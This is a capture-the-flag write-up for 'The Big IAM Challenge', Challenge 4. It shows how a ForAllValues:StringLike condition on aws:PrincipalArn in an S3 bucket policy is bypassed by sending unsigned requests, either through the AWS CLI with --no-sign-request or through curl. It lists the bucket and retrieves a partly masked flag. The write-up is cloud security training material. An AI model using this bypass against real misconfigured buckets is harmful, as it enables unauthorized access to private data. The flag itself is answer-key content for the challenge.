# Challenge 4

## We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

## Solution

- https://awstip.com/creating-unintentional-ways-to-bypass-aws-iam-policies-when-using-the-forallvalues-operator-3516a7f17ed0
- ForAllValues:StringLike - It also returns true if there are no keys in the request, or if the key values resolve to a null data set, such as an empty string.
- Hence the condition is bypassed.
- The GetObject has an open access, howerver the ListBucket is conditional based on ARN.
- Using --no-sign-request we send an request without an ARN of the current user ( my assunption ). Hence PrincipalArn will not be in the key of the request.

### Method 1


``` bash

> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ 
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
2023-06-07 19:15:43         42 flag-as-admin.txt
2023-06-08 19:20:01      81889 logo-admin.png
```
```bash
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - 
{wiz:principal-arn-is-not-xxxxxxxxxxxx}
```

### Method 2 ( Reference : https://iash.dev/posts/the-big-iam-challenge-ctf-walkthrough/ )
1. Create a curl request for the directory listing
```bash
curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefix>files/</Prefix><Marker></Marker><MaxKeys>1000<
/MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>files/flag-as-admin.txt</Key><LastModified>2023-06-07T19:15:43.000Z</LastModified><ETag>"e365cfa7365164c05d7a9c209c4d
8514"</ETag><Size>42</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-admin.png</Key><LastModified>2023-06-08T19:20:01.000Z</LastModified><ETa
g>"c57e95e6d6c138818bf38daac6216356"</ETag><Size>81889</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
```
2. Create a curl request for retrieving the flag
```bash
curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt"
```
